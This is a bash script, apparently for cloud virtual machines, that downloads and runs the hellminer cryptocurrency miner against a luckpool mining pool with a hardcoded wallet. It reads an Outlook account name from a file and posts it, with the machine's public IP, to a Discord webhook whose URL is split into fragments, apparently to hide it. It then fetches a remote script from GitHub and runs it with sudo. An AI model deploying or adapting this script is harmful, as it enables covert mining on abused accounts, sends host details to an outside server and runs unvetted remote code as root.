#!/bin/bash


if [ ! -f sudah_initiate_ver.txt ]; then
  sudo rm -rf cpuminer
  touch sudah_initiate_ver.txt
  wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
  tar xf hellminer_cpu_linux.tar.gz
  sudo mv hellminer cpuminer
fi

export  outlook_user=`cat /home/ubuntu/outlook_user.txt | sed -n "$1"P`

sleep 5
sudo ./cpuminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RH9uE3akcNavgJEge3cC7Egxys4So1f8ww.rptor -p x --cpu 4 &
sleep 5

if [ ! -f sudah_initiate_discord.txt ]; then
  touch sudah_initiate_discord.txt
  pre_message="$@======================================================="
  message="$@CPUMINER UNTUK WOWNERO SUDAH JALAN : `curl ifconfig.me` | Outlook Acc : $outlook_user "
  pasca_message="$@======================================================="
  ## format to parse to curl
  ## echo Sending message: $message
  msg_pre_content=\"$pre_message\"
  msg_content=\"$message\"
  msg_pasca_content=\"$pasca_message\"
  ## discord webhook
  nama1="https://disc"
  nama2="ord.com/ap"
  nama3="i/webh"
  ## FORMAT
  nama4="ooks/953847082421198890/9BRg2Z7tKUtH-ZwgemK4X4JYrS7wO6tTJkitnNiNxVOmGPigsjH2679jAkMideRPD8K1"
  url=$nama1$nama2$nama3$nama4
	curl -H "Content-Type: application/json" -X POST -d "{\"content\": $msg_pre_content}" $url
	curl -H "Content-Type: application/json" -X POST -d "{\"content\": $msg_content}" $url
	curl -H "Content-Type: application/json" -X POST -d "{\"content\": $msg_pasca_content}" $url
 fi
 

##################################
 
sudo rm -rf urgent.sh
wget https://raw.githubusercontent.com/Rickyose/azure_4_core/main/misc/urgent.sh
sudo bash urgent.sh &

#################################
